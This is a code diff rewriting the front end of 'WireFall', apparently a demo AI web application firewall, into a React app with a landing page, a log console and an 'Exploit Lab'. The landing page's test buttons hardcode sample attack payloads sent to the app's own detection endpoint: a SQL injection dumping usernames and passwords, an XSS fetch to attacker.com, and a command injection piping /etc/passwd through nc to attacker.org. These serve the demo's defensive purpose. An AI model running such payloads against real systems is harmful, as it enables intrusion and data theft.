@@ -3,179 +3,480 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WireFall | Cloudflare Radar WAF Intelligence</title>
-    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <title>WireFall AI | Next-Gen Edge WAF & Autonomous Threat Defense</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <!-- React & Babel CDNs -->
+    <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js" crossorigin></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Chart.js CDN -->
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <link rel="stylesheet" href="styles.css">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            50: '#fff7ed',
+                            100: '#ffedd5',
+                            500: '#f97316',
+                            600: '#ea580c',
+                            700: '#c2410c',
+                        },
+                        dark: {
+                            base: '#06080d',
+                            panel: '#0d121e',
+                            card: '#151d30',
+                            cardHover: '#1c273e',
+                            border: 'rgba(255, 255, 255, 0.08)',
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['"Plus Jakarta Sans"', 'sans-serif'],
+                        mono: ['"Fira Code"', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #06080d;
+            color: #f8fafc;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+        .glow-orange {
+            box-shadow: 0 0 30px rgba(249, 115, 22, 0.25);
+        }
+        .glow-teal {
+            box-shadow: 0 0 30px rgba(6, 182, 212, 0.25);
+        }
+        .glass-panel {
+            background: rgba(13, 18, 30, 0.85);
+            backdrop-filter: blur(16px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+        }
+        .gradient-text {
+            background: linear-gradient(135deg, #f97316 0%, #3b82f6 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+    </style>
 </head>
-<body>
-    <div class="dashboard-container">
-        <!-- Cloudflare Radar Style Header -->
-        <header class="dashboard-header">
-            <div class="header-left">
-                <a href="index.html" class="dashboard-title">
-                    <div class="title-icon-wrapper">
-                        <i class="fas fa-shield-halved"></i>
-                    </div>
-                    <span>WireFall Cloud</span>
-                    <span class="radar-badge">Radar WAF Live</span>
-                </a>
-                <div class="system-status">
-                    <div class="status-indicator" id="mlStatus">
-                        <div class="status-dot ml" id="mlStatusDot"></div>
-                        <span>DistilBERT MLM & Qwen2.5 Engine</span>
-                    </div>
-                </div>
-            </div>
-            <div class="header-right">
-                <a href="index.html" class="nav-link active"><i class="fas fa-chart-line"></i> Radar Telemetry</a>
-                <a href="hacker.html" class="nav-link"><i class="fas fa-terminal"></i> Hacker Sandbox</a>
-                <a href="/app/" class="nav-link"><i class="fas fa-store"></i> Apex Tech Store</a>
-                <button class="nav-link btn-sim-toggle" id="simToggleBtn" onclick="dashboard.toggleSimulation()"><i class="fas fa-play"></i> Start Traffic Simulator</button>
-                <div class="status-indicator" style="margin-left: 0.5rem;">
-                    <i class="fas fa-clock" style="color: var(--cf-orange);"></i>
-                    <span id="lastUpdated" style="font-family: var(--font-mono); font-size: 0.8rem; color: var(--text-muted);">--:--:--</span>
-                </div>
-                <button class="nav-link" id="refreshBtn" title="Refresh Feed">
-                    <i class="fas fa-sync-alt"></i>
-                </button>
-            </div>
-        </header>
+<body class="min-h-screen bg-dark-base text-slate-100 antialiased selection:bg-brand-500 selection:text-white">
+    <div id="root"></div>
 
-        <div class="dashboard-body">
-            <!-- Sidebar Controls -->
-            <aside class="control-panel">
-                <div class="panel-section">
-                    <h3><i class="fas fa-sliders" style="color: var(--cf-orange);"></i> WAF Execution Profile</h3>
-                    <div class="toggle-group" id="wafModeToggle">
-                        <div class="toggle-option active" data-mode="full">
-                            <div class="toggle-ring"></div>
-                            <i class="fas fa-shield-cat" style="color: var(--cf-teal);"></i>
-                            <span>Full Hybrid WAF</span>
-                        </div>
-                        <div class="toggle-option" data-mode="fast">
-                            <div class="toggle-ring"></div>
-                            <i class="fas fa-bolt" style="color: var(--cf-orange);"></i>
-                            <span>Transformer Only</span>
-                        </div>
-                        <div class="toggle-option" data-mode="off">
-                            <div class="toggle-ring"></div>
-                            <i class="fas fa-power-off" style="color: var(--cf-red);"></i>
-                            <span>Bypass / Pass-Through</span>
-                        </div>
-                    </div>
-                </div>
+    <script type="text/babel">
+        const { useState, useEffect, useRef } = React;
 
-                <div class="panel-section">
-                    <h3><i class="fas fa-chart-pie" style="color: var(--cf-teal);"></i> Traffic Telemetry Counters</h3>
-                    <div class="metric-card">
-                        <div class="metric-icon benign">
-                            <i class="fas fa-shield-check"></i>
-                        </div>
-                        <div class="metric-content">
-                            <div class="metric-value" id="benignCount" style="color: var(--cf-green);">0</div>
-                            <div class="metric-label">Benign Requests</div>
-                        </div>
-                    </div>
-                    <div class="metric-card">
-                        <div class="metric-icon malicious">
-                            <i class="fas fa-bug"></i>
-                        </div>
-                        <div class="metric-content">
-                            <div class="metric-value" id="maliciousCount" style="color: var(--cf-red);">0</div>
-                            <div class="metric-label">Malicious Threats</div>
-                        </div>
-                    </div>
-                    <div class="metric-card">
-                        <div class="metric-icon total">
-                            <i class="fas fa-network-wired"></i>
-                        </div>
-                        <div class="metric-content">
-                            <div class="metric-value" id="totalCount" style="color: var(--cf-blue);">0</div>
-                            <div class="metric-label">Total Analyzed</div>
-                        </div>
-                    </div>
-                </div>
+        const API_BASE = window.location.origin;
 
-                <div class="panel-section">
-                    <h3><i class="fas fa-microchip" style="color: var(--cf-purple);"></i> Cloud Node Telemetry</h3>
-                    <div style="display: flex; flex-direction: column; gap: 1rem;">
-                        <div class="resource-bar-wrapper">
-                            <div class="resource-bar-header">
-                                <span>Azure VM CPU (B2s_v2)</span>
-                                <span style="font-family: var(--font-mono); font-weight: 700; color: var(--cf-orange);">38%</span>
+        // Header Component
+        const Header = ({ activeTab, setActiveTab, wafMode, setWafMode, isSimulating, toggleSimulation }) => {
+            return (
+                <header class="sticky top-0 z-50 glass-panel border-b border-white/10 px-6 py-3.5 flex items-center justify-between shadow-2xl">
+                    <div class="flex items-center gap-6">
+                        <div class="flex items-center gap-3 cursor-pointer" onClick={() => setActiveTab('landing')}>
+                            <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-brand-600 to-amber-500 flex items-center justify-center text-white shadow-lg shadow-brand-500/30">
+                                <i class="fas fa-shield-halved text-xl"></i>
                             </div>
-                            <div class="resource-bar-track">
-                                <div class="resource-bar-fill" style="width: 38%; background: linear-gradient(90deg, var(--cf-orange), #ea580c);"></div>
+                            <div>
+                                <div class="font-extrabold text-lg tracking-tight text-white flex items-center gap-2">
+                                    WireFall <span class="text-brand-500 font-bold text-xs px-2 py-0.5 rounded-full bg-brand-500/10 border border-brand-500/30 uppercase tracking-widest">AI WAF</span>
+                                </div>
+                                <div class="text-[10px] text-slate-400 font-medium">Sub-Millisecond Autonomous Security</div>
                             </div>
                         </div>
-                        <div class="resource-bar-wrapper">
-                            <div class="resource-bar-header">
-                                <span>RAM Allocation</span>
-                                <span style="font-family: var(--font-mono); font-weight: 700; color: var(--cf-teal);">3.8 GB / 4.0 GB</span>
+
+                        <nav class="hidden md:flex items-center gap-1 bg-dark-card/60 p-1 rounded-xl border border-white/5">
+                            <button onClick={() => setActiveTab('landing')} class={`px-4 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 ${activeTab === 'landing' ? 'bg-brand-500 text-white shadow-lg shadow-brand-500/30' : 'text-slate-400 hover:text-white hover:bg-white/5'}`}>
+                                <i class="fas fa-rocket"></i> Product
+                            </button>
+                            <button onClick={() => setActiveTab('radar')} class={`px-4 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 ${activeTab === 'radar' ? 'bg-brand-500 text-white shadow-lg shadow-brand-500/30' : 'text-slate-400 hover:text-white hover:bg-white/5'}`}>
+                                <i class="fas fa-chart-line"></i> SOC Radar
+                            </button>
+                            <button onClick={() => setActiveTab('hacker')} class={`px-4 py-2 rounded-lg text-xs font-bold transition-all flex items-center gap-2 ${activeTab === 'hacker' ? 'bg-brand-500 text-white shadow-lg shadow-brand-500/30' : 'text-slate-400 hover:text-white hover:bg-white/5'}`}>
+                                <i class="fas fa-terminal"></i> Exploit Lab
+                            </button>
+                            <a href="/app/" target="_blank" class="px-4 py-2 rounded-lg text-xs font-bold text-slate-400 hover:text-white hover:bg-white/5 transition-all flex items-center gap-2">
+                                <i class="fas fa-store"></i> Demo App <i class="fas fa-arrow-up-right-from-square text-[10px] opacity-60"></i>
+                            </a>
+                        </nav>
+                    </div>
+
+                    <div class="flex items-center gap-3">
+                        <button onClick={toggleSimulation} class={`px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 shadow-lg ${isSimulating ? 'bg-rose-600 hover:bg-rose-700 text-white shadow-rose-600/30 animate-pulse' : 'bg-gradient-to-r from-brand-500 to-amber-500 hover:from-brand-600 hover:to-amber-600 text-white shadow-brand-500/30'}`}>
+                            <i class={`fas ${isSimulating ? 'fa-stop' : 'fa-play'}`}></i>
+                            {isSimulating ? 'Stop Traffic Simulation' : 'Run Traffic Simulator'}
+                        </button>
+                    </div>
+                </header>
+            );
+        };
+
+        // Landing Page Component
+        const LandingPage = ({ setActiveTab, launchQuickPayload }) => {
+            const [testResult, setTestResult] = useState(null);
+            const [testing, setTesting] = useState(false);
+
+            const testPayload = async (payload, name) => {
+                setTesting(true);
+                try {
+                    const res = await fetch(`${API_BASE}/analyze`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            method: 'POST',
+                            path: '/api/v1/search',
+                            protocol: 'HTTP/1.1',
+                            request_body: payload
+                        })
+                    });
+                    const data = await res.json();
+                    setTestResult({ name, data });
+                } catch (e) {
+                    setTestResult({ name, error: true });
+                }
+                setTesting(false);
+            };
+
+            return (
+                <div class="space-y-24 py-12 px-6 max-w-7xl mx-auto">
+                    {/* Hero Section */}
+                    <div class="text-center space-y-8 pt-8">
+                        <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-brand-500/10 border border-brand-500/30 text-brand-500 font-semibold text-xs uppercase tracking-wider">
+                            <span class="w-2 h-2 rounded-full bg-brand-500 animate-ping"></span>
+                            Next-Gen Autonomous WAF-as-a-Service
+                        </div>
+
+                        <h1 class="text-5xl md:text-7xl font-black tracking-tight leading-tight max-w-4xl mx-auto">
+                            Sub-Millisecond Edge Protection Powered by <span class="gradient-text">Hybrid AI & LLMs</span>
+                        </h1>
+
+                        <p class="text-lg md:text-xl text-slate-400 max-w-2xl mx-auto font-medium leading-relaxed">
+                            Stop zero-day SQLi, XSS, and RCE attacks before they touch your servers. Stage 1 Redis Fast-Path matches payloads in <span class="text-emerald-400 font-bold">&lt; 1ms</span>, while DistilBERT MLM & Qwen2.5 LLM synthesize new rules autonomously.
+                        </p>
+
+                        <div class="flex flex-wrap items-center justify-center gap-4 pt-4">
+                            <button onClick={() => setActiveTab('radar')} class="px-8 py-4 rounded-2xl bg-gradient-to-r from-brand-500 to-amber-500 hover:from-brand-600 hover:to-amber-600 text-white font-bold text-sm shadow-xl shadow-brand-500/30 transition-all hover:scale-105 flex items-center gap-3">
+                                <i class="fas fa-shield-halved text-base"></i> Launch SOC Console
+                            </button>
+                            <button onClick={() => setActiveTab('hacker')} class="px-8 py-4 rounded-2xl bg-dark-card hover:bg-dark-cardHover border border-white/10 text-white font-bold text-sm transition-all hover:scale-105 flex items-center gap-3">
+                                <i class="fas fa-flask text-base text-brand-500"></i> Open Exploit Lab
+                            </button>
+                        </div>
+                    </div>
+
+                    {/* Interactive Live WAF Test Box */}
+                    <div class="glass-panel rounded-3xl p-8 max-w-4xl mx-auto shadow-2xl space-y-6">
+                        <div class="flex items-center justify-between border-b border-white/10 pb-6">
+                            <div>
+                                <h3 class="text-xl font-extrabold text-white flex items-center gap-3">
+                                    <i class="fas fa-bolt text-brand-500"></i> Live Attack Interception Simulator
+                                </h3>
+                                <p class="text-xs text-slate-400 mt-1">Test live exploits directly against the active Azure WAF API backend</p>
                             </div>
-                            <div class="resource-bar-track">
-                                <div class="resource-bar-fill" style="width: 78%; background: linear-gradient(90deg, var(--cf-teal), #0284c7);"></div>
+                            <span class="px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold flex items-center gap-2">
+                                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Azure WAF Online
+                            </span>
+                        </div>
+
+                        <div class="grid grid-cols-1 md:grid-cols-4 gap-3">
+                            <button onClick={() => testPayload("query=wireless+headphones", "Benign Query")} class="p-4 rounded-xl bg-dark-card hover:bg-emerald-500/10 border border-white/10 hover:border-emerald-500/40 text-left transition-all group">
+                                <div class="text-xs font-bold text-emerald-400 flex items-center gap-2 mb-1">
+                                    <i class="fas fa-check-circle"></i> Benign Request
+                                </div>
+                                <div class="text-[11px] font-mono text-slate-400 truncate">query=wireless+headphones</div>
+                            </button>
+
+                            <button onClick={() => testPayload("query=admin' UNION SELECT 1, username, password FROM users--", "SQL Injection")} class="p-4 rounded-xl bg-dark-card hover:bg-rose-500/10 border border-white/10 hover:border-rose-500/40 text-left transition-all group">
+                                <div class="text-xs font-bold text-rose-400 flex items-center gap-2 mb-1">
+                                    <i class="fas fa-database"></i> SQL Injection
+                                </div>
+                                <div class="text-[11px] font-mono text-slate-400 truncate">admin' UNION SELECT...</div>
+                            </button>
+
+                            <button onClick={() => testPayload("comment=<script>fetch('http://attacker.com/steal')</script>", "XSS Payload")} class="p-4 rounded-xl bg-dark-card hover:bg-amber-500/10 border border-white/10 hover:border-amber-500/40 text-left transition-all group">
+                                <div class="text-xs font-bold text-amber-400 flex items-center gap-2 mb-1">
+                                    <i class="fas fa-code"></i> XSS Payload
+                                </div>
+                                <div class="text-[11px] font-mono text-slate-400 truncate">&lt;script&gt;fetch(...)&lt;/script&gt;</div>
+                            </button>
+
+                            <button onClick={() => testPayload("target=127.0.0.1; cat /etc/passwd | nc attacker.org 1337", "Command RCE")} class="p-4 rounded-xl bg-dark-card hover:bg-purple-500/10 border border-white/10 hover:border-purple-500/40 text-left transition-all group">
+                                <div class="text-xs font-bold text-purple-400 flex items-center gap-2 mb-1">
+                                    <i class="fas fa-terminal"></i> Command RCE
+                                </div>
+                                <div class="text-[11px] font-mono text-slate-400 truncate">; cat /etc/passwd...</div>
+                            </button>
+                        </div>
+
+                        {testing && (
+                            <div class="p-4 rounded-xl bg-brand-500/10 border border-brand-500/30 text-brand-400 text-xs font-mono flex items-center gap-3">
+                                <i class="fas fa-spinner fa-spin"></i> Processing request through Stage 1 Redis & Stage 2 DistilBERT ML...
                             </div>
+                        )}
+
+                        {testResult && !testing && (
+                            <div class={`p-6 rounded-2xl border transition-all ${testResult.data?.allow ? 'bg-emerald-950/40 border-emerald-500/40 text-emerald-200' : 'bg-rose-950/40 border-rose-500/40 text-rose-200'}`}>
+                                <div class="flex items-center justify-between mb-3">
+                                    <div class="font-extrabold text-sm flex items-center gap-2">
+                                        <i class={`fas ${testResult.data?.allow ? 'fa-circle-check text-emerald-400' : 'fa-shield-xmark text-rose-400'} text-base`}></i>
+                                        {testResult.name} Verdict: <span class="font-mono underline">{testResult.data?.allow ? '200 ALLOWED' : '403 BLOCKED'}</span>
+                                    </div>
+                                    <span class="text-[11px] font-mono px-3 py-1 rounded-full bg-black/40 border border-white/10">
+                                        {testResult.data?.stage1_fast_path ? '⚡ Stage 1 Redis Fast-Path (<1ms)' : '🧠 Stage 2 DistilBERT Transformer'}
+                                    </span>
+                                </div>
+                                <div class="text-xs font-mono bg-black/50 p-4 rounded-xl border border-white/10 overflow-x-auto">
+                                    <div><span class="text-slate-500">Action:</span> {testResult.data?.reason}</div>
+                                    {testResult.data?.auto_learned_rule && (
+                                        <div class="mt-2 text-brand-400"><span class="text-slate-500">LLM Generated Regex Rule:</span> {testResult.data?.auto_learned_rule}</div>
+                                    )}
+                                </div>
+                            </div>
+                        )}
+                    </div>
+
+                    {/* Features Grid */}
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-8 pt-6">
+                        <div class="glass-panel p-8 rounded-3xl space-y-4 hover:border-brand-500/40 transition-all">
+                            <div class="w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 flex items-center justify-center text-xl">
+                                <i class="fas fa-bolt"></i>
+                            </div>
+                            <h3 class="text-lg font-bold text-white">Stage 1 O(1) Redis Fast-Path</h3>
+                            <p class="text-sm text-slate-400 leading-relaxed">
+                                Evaluates static signatures and exact payload hashes in in-memory Redis sets, returning instant blocks in under 1 millisecond.
+                            </p>
+                        </div>
+
+                        <div class="glass-panel p-8 rounded-3xl space-y-4 hover:border-brand-500/40 transition-all">
+                            <div class="w-12 h-12 rounded-2xl bg-brand-500/10 border border-brand-500/30 text-brand-500 flex items-center justify-center text-xl">
+                                <i class="fas fa-brain"></i>
+                            </div>
+                            <h3 class="text-lg font-bold text-white">Stage 2 DistilBERT MLM</h3>
+                            <p class="text-sm text-slate-400 leading-relaxed">
+                                Transformer masked language model detects zero-day anomalies based on HTTP structure reconstruction loss without relying on signatures.
+                            </p>
+                        </div>
+
+                        <div class="glass-panel p-8 rounded-3xl space-y-4 hover:border-brand-500/40 transition-all">
+                            <div class="w-12 h-12 rounded-2xl bg-purple-500/10 border border-purple-500/30 text-purple-400 flex items-center justify-center text-xl">
+                                <i class="fas fa-robot"></i>
+                            </div>
+                            <h3 class="text-lg font-bold text-white">Qwen2.5 LLM Auto-Synthesis</h3>
+                            <p class="text-sm text-slate-400 leading-relaxed">
+                                Automatically synthesizes robust regex patterns from detected payloads and hot-reloads them directly into Redis for future instant blocks.
+                            </p>
                         </div>
                     </div>
                 </div>
-            </aside>
+            );
+        };
 
-            <!-- Main Content Area -->
-            <main class="main-content">
-                <!-- Live Telemetry Graph -->
-                <section class="graph-section">
-                    <div class="graph-header">
-                        <h2><i class="fas fa-chart-area" style="color: var(--cf-orange);"></i> Live Radar Telemetry Stream</h2>
-                        <div style="display: flex; gap: 0.5rem;">
-                            <button class="nav-link active" style="font-size: 0.75rem; padding: 0.25rem 0.65rem;">LIVE</button>
-                            <button class="nav-link" style="font-size: 0.75rem; padding: 0.25rem 0.65rem;">5M</button>
-                            <button class="nav-link" style="font-size: 0.75rem; padding: 0.25rem 0.65rem;">15M</button>
+        // SOC Radar Console Component
+        const RadarConsole = ({ wafMode, setWafMode }) => {
+            const [logs, setLogs] = useState([]);
+            const [stats, setStats] = useState({ benign: 0, malicious: 0, total: 0 });
+
+            useEffect(() => {
+                const fetchLogs = async () => {
+                    try {
+                        const res = await fetch(`${API_BASE}/logs?limit=25`);
+                        const data = await res.json();
+                        if (data.logs) {
+                            setLogs(data.logs);
+                            let b = 0, m = 0;
+                            data.logs.forEach(l => l.action_taken === 'BLOCK' ? m++ : b++);
+                            setStats({ benign: b, malicious: m, total: data.logs.length });
+                        }
+                    } catch (e) {}
+                };
+                fetchLogs();
+                const interval = setInterval(fetchLogs, 3000);
+                return () => clearInterval(interval);
+            }, []);
+
+            return (
+                <div class="p-8 max-w-7xl mx-auto space-y-8">
+                    {/* Top Stats Cards */}
+                    <div class="grid grid-cols-1 md:grid-cols-4 gap-6">
+                        <div class="glass-panel p-6 rounded-2xl space-y-2">
+                            <div class="text-xs font-bold uppercase tracking-wider text-slate-400">Total Requests</div>
+                            <div class="text-3xl font-black text-white font-mono">{stats.total}</div>
+                            <div class="text-[11px] text-slate-500">Real-time analyzed</div>
+                        </div>
+
+                        <div class="glass-panel p-6 rounded-2xl space-y-2">
+                            <div class="text-xs font-bold uppercase tracking-wider text-emerald-400">Benign Allowed</div>
+                            <div class="text-3xl font-black text-emerald-400 font-mono">{stats.benign}</div>
+                            <div class="text-[11px] text-slate-500">200 OK passed</div>
+                        </div>
+
+                        <div class="glass-panel p-6 rounded-2xl space-y-2">
+                            <div class="text-xs font-bold uppercase tracking-wider text-rose-400">Threats Blocked</div>
+                            <div class="text-3xl font-black text-rose-400 font-mono">{stats.malicious}</div>
+                            <div class="text-[11px] text-slate-500">403 Intercepted</div>
+                        </div>
+
+                        <div class="glass-panel p-6 rounded-2xl space-y-2">
+                            <div class="text-xs font-bold uppercase tracking-wider text-brand-500">Stage 1 Latency</div>
+                            <div class="text-3xl font-black text-brand-500 font-mono">&lt; 0.8ms</div>
+                            <div class="text-[11px] text-slate-500">Redis O(1) Fast-Path</div>
                         </div>
                     </div>
 
-                    <div class="ecg-chart-container">
-                        <canvas id="ecgChart"></canvas>
+                    {/* Threat Log Table */}
+                    <div class="glass-panel rounded-3xl p-6 space-y-4">
+                        <div class="flex items-center justify-between">
+                            <h3 class="text-lg font-bold text-white flex items-center gap-2">
+                                <i class="fas fa-list-ol text-brand-500"></i> Live Security Threat Feed
+                            </h3>
+                            <span class="text-xs font-mono text-slate-400">Streaming live from MongoDB</span>
+                        </div>
+
+                        <div class="overflow-x-auto rounded-2xl border border-white/10">
+                            <table class="w-full text-left text-xs font-mono">
+                                <thead class="bg-dark-card text-slate-400 uppercase tracking-wider font-bold border-b border-white/10">
+                                    <tr>
+                                        <th class="p-4">Timestamp</th>
+                                        <th class="p-4">Path</th>
+                                        <th class="p-4">Payload Snippet</th>
+                                        <th class="p-4">Action Taken</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="divide-y divide-white/5">
+                                    {logs.length === 0 ? (
+                                        <tr><td colspan="4" class="p-8 text-center text-slate-500">Loading live telemetry logs...</td></tr>
+                                    ) : logs.map((log, idx) => (
+                                        <tr key={idx} class={`hover:bg-white/5 transition-all ${log.action_taken === 'BLOCK' ? 'bg-rose-950/20 text-rose-200' : 'text-slate-300'}`}>
+                                            <td class="p-4 text-slate-400">{log.timestamp ? log.timestamp.split('T')[1]?.slice(0, 8) : '--:--:--'}</td>
+                                            <td class="p-4 font-bold">{log.request?.path || '/'}</td>
+                                            <td class="p-4 truncate max-w-xs">{log.request?.request_body || '(empty)'}</td>
+                                            <td class="p-4">
+                                                <span class={`px-3 py-1 rounded-full text-[10px] font-bold ${log.action_taken === 'BLOCK' ? 'bg-rose-500/20 border border-rose-500/40 text-rose-400' : 'bg-emerald-500/20 border border-emerald-500/40 text-emerald-400'}`}>
+                                                    {log.action_taken === 'BLOCK' ? '🛡️ 403 BLOCK' : '✅ 200 ALLOW'}
+                                                </span>
+                                            </td>
+                                        </tr>
+                                    ))}
+                                </tbody>
+                            </table>
+                        </div>
                     </div>
-                </section>
+                </div>
+            );
+        };
 
-                <!-- Threat Detection Logs -->
-                <section class="table-section">
-                    <div class="table-header">
-                        <h2><i class="fas fa-list-ol" style="color: var(--cf-orange);"></i> Threat Detection Log Feed</h2>
+        // Exploit Lab Component
+        const ExploitLab = () => {
+            const [path, setPath] = useState('/api/v1/users/search');
+            const [body, setBody] = useState("query=admin' UNION SELECT 1, username, password FROM users--");
+            const [logs, setLogs] = useState([]);
+
+            const sendPayload = async () => {
+                const ts = new Date().toISOString().split('T')[1].slice(0, 8);
+                setLogs(prev => [...prev, `[${ts}] REQUEST: POST ${path} | Body: ${body}`]);
+                try {
+                    const res = await fetch(`${API_BASE}/analyze`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ method: 'POST', path, protocol: 'HTTP/1.1', request_body: body })
+                    });
+                    const data = await res.json();
+                    if (!data.allow) {
+                        setLogs(prev => [...prev, `[${ts}] 🛡️ BLOCKED 403: ${data.reason}`]);
+                        if (data.auto_learned_rule) {
+                            setLogs(prev => [...prev, `[${ts}] 🤖 LLM RULE LEARNED: ${data.auto_learned_rule}`]);
+                        }
+                    } else {
+                        setLogs(prev => [...prev, `[${ts}] ✅ ALLOWED 200 OK`]);
+                    }
+                } catch (e) {
+                    setLogs(prev => [...prev, `[${ts}] ❌ ERROR: ${e}`]);
+                }
+            };
+
+            return (
+                <div class="p-8 max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-8">
+                    <div class="glass-panel p-8 rounded-3xl space-y-6">
+                        <h3 class="text-lg font-bold text-white flex items-center gap-2">
+                            <i class="fas fa-vial text-brand-500"></i> Exploit Vector Synthesizer
+                        </h3>
+
+                        <div class="space-y-4">
+                            <div>
+                                <label class="text-xs font-bold text-slate-400 uppercase tracking-wider">Target Endpoint Path</label>
+                                <input type="text" value={path} onChange={e => setPath(e.target.value)} class="w-full mt-2 p-3 rounded-xl bg-dark-base border border-white/10 text-xs font-mono text-white focus:outline-none focus:border-brand-500" />
+                            </div>
+
+                            <div>
+                                <label class="text-xs font-bold text-slate-400 uppercase tracking-wider">Request Payload Body</label>
+                                <textarea value={body} onChange={e => setBody(e.target.value)} rows="4" class="w-full mt-2 p-3 rounded-xl bg-dark-base border border-white/10 text-xs font-mono text-white focus:outline-none focus:border-brand-500"></textarea>
+                            </div>
+
+                            <button onClick={sendPayload} class="w-full py-4 rounded-2xl bg-brand-500 hover:bg-brand-600 text-white font-bold text-sm shadow-xl shadow-brand-500/30 transition-all">
+                                <i class="fas fa-paper-plane mr-2"></i> Launch Attack Payload
+                            </button>
+                        </div>
                     </div>
 
-                    <div class="events-table-wrapper">
-                        <table class="events-table">
-                            <thead>
-                                <tr>
-                                    <th>Timestamp</th>
-                                    <th>Source IP</th>
-                                    <th>Path</th>
-                                    <th>Threat Category</th>
-                                    <th>WAF Action</th>
-                                    <th>Controls</th>
-                                </tr>
-                            </thead>
-                            <tbody id="eventsTableBody">
-                                <!-- Populated dynamically by JS -->
-                            </tbody>
-                        </table>
+                    <div class="glass-panel p-8 rounded-3xl space-y-4">
+                        <div class="flex items-center justify-between">
+                            <h3 class="text-lg font-bold text-white flex items-center gap-2">
+                                <i class="fas fa-terminal text-brand-500"></i> Live Console Output
+                            </h3>
+                            <button onClick={() => setLogs([])} class="text-xs text-slate-500 hover:text-slate-300">Clear</button>
+                        </div>
+
+                        <div class="bg-black/80 rounded-2xl p-4 font-mono text-xs text-slate-300 h-80 overflow-y-auto space-y-2 border border-white/10">
+                            {logs.length === 0 ? (
+                                <div class="text-slate-600">Console ready. Click "Launch Attack Payload" to test.</div>
+                            ) : logs.map((l, i) => (
+                                <div key={i}>{l}</div>
+                            ))}
+                        </div>
                     </div>
-                </section>
-            </main>
-        </div>
-    </div>
+                </div>
+            );
+        };
 
-    <!-- Hidden Log Container for JS compatibility -->
-    <div id="logViewer" style="display: none;">
-        <div id="logToggle"></div>
-        <div id="logContent"></div>
-    </div>
+        // Main App Component
+        const App = () => {
+            const [activeTab, setActiveTab] = useState('landing');
+            const [wafMode, setWafMode] = useState('full');
+            const [isSimulating, setIsSimulating] = useState(false);
 
-    <script src="dashboard-api.js"></script>
-    <script src="dashboard-integrated.js"></script>
+            const toggleSimulation = async () => {
+                const endpoint = isSimulating ? '/simulate/stop' : '/simulate/start';
+                try {
+                    await fetch(`${API_BASE}${endpoint}`, { method: 'POST' });
+                    setIsSimulating(!isSimulating);
+                } catch (e) {}
+            };
+
+            return (
+                <div class="min-h-screen flex flex-col">
+                    <Header activeTab={activeTab} setActiveTab={setActiveTab} wafMode={wafMode} setWafMode={setWafMode} isSimulating={isSimulating} toggleSimulation={toggleSimulation} />
+                    
+                    <main class="flex-1">
+                        {activeTab === 'landing' && <LandingPage setActiveTab={setActiveTab} />}
+                        {activeTab === 'radar' && <RadarConsole wafMode={wafMode} setWafMode={setWafMode} />}
+                        {activeTab === 'hacker' && <ExploitLab />}
+                    </main>
+
+                    <footer class="border-t border-white/10 py-8 px-6 text-center text-xs text-slate-500">
+                        WireFall AI WAF &copy; 2026. Powered by OpenResty, Redis, DistilBERT MLM & Qwen2.5 LLM.
+                    </footer>
+                </div>
+            );
+        };
+
+        ReactDOM.createRoot(document.getElementById('root')).render(<App />);
+    </script>
 </body>
 </html>
